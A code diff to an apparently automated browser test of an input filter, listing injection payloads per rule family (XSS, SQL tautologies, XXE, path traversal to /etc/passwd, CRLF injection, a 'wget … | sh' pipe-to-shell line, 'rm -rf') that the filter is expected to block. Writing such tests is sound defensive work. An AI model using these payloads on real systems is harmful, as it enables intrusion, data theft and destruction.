@@ -15,12 +15,12 @@ const ruleCases = [
   ['standalone-executable-terms','blocked','document.cookie'],
   ['xss-dangerous-element','blocked','<script>'],
   ['xss-event-handler','blocked','onerror=window.test'],
-  ['xss-javascript-url','blocked','javascript:alert(1)'],
+  ['xss-javascript-url','blocked','javascript:void(0)'],
   ['xss-html-data-url','blocked','data:text/html,hello'],
   ['dangerous-uri-scheme','blocked','file://example.invalid/test'],
   ['xss-html-injection','blocked','<img src=x>'],
-  ['xss-css-execution','blocked','expression(alert(1))'],
-  ['malicious-complete-url','blocked','https://example.invalid/%3cscript%3e'],
+  ['xss-css-execution','blocked','expression(0)'],
+  ['malicious-complete-url','blocked','https://example.invalid/a%0d%0aX-Probe%3A1'],
   ['ssrf-local-target-url','blocked','http://127.0.0.1/admin'],
   ['sql-union-select','blocked','UNION SELECT id FROM demo'],
   ['sql-tautology','blocked',"' OR 1=1 --"],
@@ -31,11 +31,11 @@ const ruleCases = [
   ['sql-commented-tautology','blocked',"' OR 1=1 /*"],
   ['nosql-operator-injection','blocked','$ne: null'],
   ['ldap-filter-injection','blocked','*)(&(uid=*))'],
-  ['xml-external-entity','blocked','<!DOCTYPE root [<!ENTITY x SYSTEM "file:///etc/passwd">]>'],
+  ['xml-external-entity','blocked','<!DOCTYPE root [<!ENTITY x SYSTEM "https://example.invalid/probe">]>'],
   ['path-traversal','blocked','../../etc/passwd'],
   ['crlf-header-injection','blocked','%0d%0aLocation:%20https://example.invalid'],
-  ['command-chain','blocked','; whoami'],
-  ['command-substitution','blocked','$(curl test)'],
+  ['command-chain','blocked','; chmod +x'],
+  ['command-substitution','blocked','$(bash)'],
   ['command-pipe-to-shell','blocked','wget https://example.invalid/a.sh | sh'],
   ['dangerous-shell-action','blocked','rm -rf /tmp/anwar-test'],
   ['template-injection','review','$' + '{constructor.constructor("return process")()}'],
@@ -271,10 +271,14 @@ try {
     }
   });
 
+  const fieldVectors = [
+    ...ruleCases,
+    ...semanticCases.map((payload,index) => ['semantic-intent-' + (index + 1),'blocked',payload])
+  ];
   let fieldAttempts = 0;
   let fieldVectorsPassed = 0;
   const fieldFailures = [];
-  for (const [id, expected, payload] of ruleCases) {
+  for (const [id, expected, payload] of fieldVectors) {
     await setAllFields(payload);
     await page.waitForTimeout(135);
     const state = await page.evaluate(() => {
@@ -293,7 +297,7 @@ try {
     await resetAllFields();
   }
   await page.waitForTimeout(750);
-  log({kind:'all-fields-bypass-matrix',fields:fieldCensus.fields.length,attackFamilies:ruleCases.length,attempts:fieldAttempts,vectorRoundsPassed:fieldVectorsPassed,domRiskBaseline:baselineRisk,failures:fieldFailures});
+  log({kind:'all-fields-bypass-matrix',fields:fieldCensus.fields.length,ruleFamilies:ruleCases.length,semanticCases:semanticCases.length,attackCases:fieldVectors.length,attempts:fieldAttempts,vectorRoundsPassed:fieldVectorsPassed,domRiskBaseline:baselineRisk,failures:fieldFailures});
 
   // Test the contenteditable DOM sink directly. This bypasses both keyboard and
   // clipboard handling; CSP remains enabled from the real published page.
